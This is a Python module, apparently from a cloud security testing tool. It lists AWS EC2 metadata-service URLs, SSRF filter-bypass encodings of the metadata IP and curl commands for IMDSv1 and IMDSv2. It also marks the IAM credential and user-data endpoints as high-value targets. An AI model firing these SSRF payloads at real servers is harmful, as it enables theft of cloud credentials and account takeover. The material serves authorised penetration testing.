"""
EC2 Metadata and SSRF Patterns
Endpoints for metadata service enumeration and SSRF testing
"""

from typing import Dict, Any


# Metadata service endpoints
METADATA_ENDPOINTS = {
    'base': 'http://169.254.169.254/latest/meta-data/',
    'iam_credentials': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'user_data': 'http://169.254.169.254/latest/user-data',
    'ami_id': 'http://169.254.169.254/latest/meta-data/ami-id',
    'public_hostname': 'http://169.254.169.254/latest/meta-data/public-hostname',
    'public_keys': 'http://169.254.169.254/latest/meta-data/public-keys/',
    'local_ipv4': 'http://169.254.169.254/latest/meta-data/local-ipv4',
    'instance_id': 'http://169.254.169.254/latest/meta-data/instance-id',
    'instance_type': 'http://169.254.169.254/latest/meta-data/instance-type',
    'placement': 'http://169.254.169.254/latest/meta-data/placement/availability-zone',
    'identity_document': 'http://169.254.169.254/latest/dynamic/instance-identity/document',
}

# IMDSv2 token endpoint
IMDSV2_TOKEN_ENDPOINT = 'http://169.254.169.254/latest/api/token'

# SSRF bypass patterns
SSRF_BYPASSES = [
    'http://169.254.169.254/',
    'http://2852039166/',  # Decimal IP
    'http://[::ffff:a9fe:a9fe]/',  # IPv6 compressed
    'http://[0:0:0:0:0:ffff:a9fe:a9fe]/',  # IPv6 expanded
    'http://instance-data/',
    'http://169.254.169.254.xip.io/',
]


def get_ssrf_patterns() -> Dict[str, Any]:
    """
    Get metadata service SSRF patterns for testing.
    
    Returns:
        Dictionary with SSRF patterns and payloads
    """
    return {
        'imdsv1': {
            'endpoints': METADATA_ENDPOINTS,
            'example_curl': 'curl http://169.254.169.254/latest/meta-data/',
            'external_check': 'curl http://<ec2-ip>/?url=http://169.254.169.254/latest/meta-data/'
        },
        'imdsv2': {
            'token_endpoint': IMDSV2_TOKEN_ENDPOINT,
            'token_request': 'curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"',
            'data_request': 'curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"'
        },
        'bypasses': SSRF_BYPASSES,
        'high_value_targets': [
            METADATA_ENDPOINTS['iam_credentials'],
            METADATA_ENDPOINTS['user_data'],
            METADATA_ENDPOINTS['identity_document']
        ],
        'note': 'IMDSv2 requires PUT request for token first; many SSRF only allow GET'
    }


__all__ = [
    'METADATA_ENDPOINTS',
    'IMDSV2_TOKEN_ENDPOINT',
    'SSRF_BYPASSES',
    'get_ssrf_patterns'
]
